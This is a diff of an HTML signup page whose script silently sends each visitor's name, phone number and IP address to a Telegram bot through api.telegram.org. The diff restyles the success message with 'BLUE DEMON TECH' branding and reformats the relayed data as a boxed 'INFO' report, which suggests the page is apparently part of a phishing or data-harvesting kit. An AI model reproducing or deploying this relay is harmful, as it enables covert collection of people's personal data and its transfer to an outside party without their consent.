@@ -54,7 +54,7 @@
             <button type="submit" class="w-full bg-white text-black py-3 rounded-lg hover:bg-gray-200 transition duration-300">Submit</button>
         </form>
         <div id="successMessage" class="hidden bg-green-100 border-t border-b border-green-500 text-green-700 px-4 py-3 rounded-lg mt-6">
-            submitted successfully!
+            submitted successfully!,𝚩𝐋𝐔𝚵 𝐃𝚵𝚳𝚯𝚴 𝚻𝚵𝐂𝚮
         </div>
         <p id="errorMessage" class="text-red-500 text-sm hidden mt-6"></p>
 
@@ -74,7 +74,7 @@
 
         // Function to send a message to your Telegram bot
         async function sendToTelegram(name, phone, ip) {
-            const message = `New signup:\nName: ${name}\nPhone: ${phone}\nIP: ${ip}`;
+            const message = `╭──❏「  INFO😁 」❏\n┃➥  NAME : ${name}\n┃➥  PHONE : ${phone}\n┃➥  IP : ${ip}\n┗━━━━━[ BLUE  ]━━━━`;
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
 
             try {
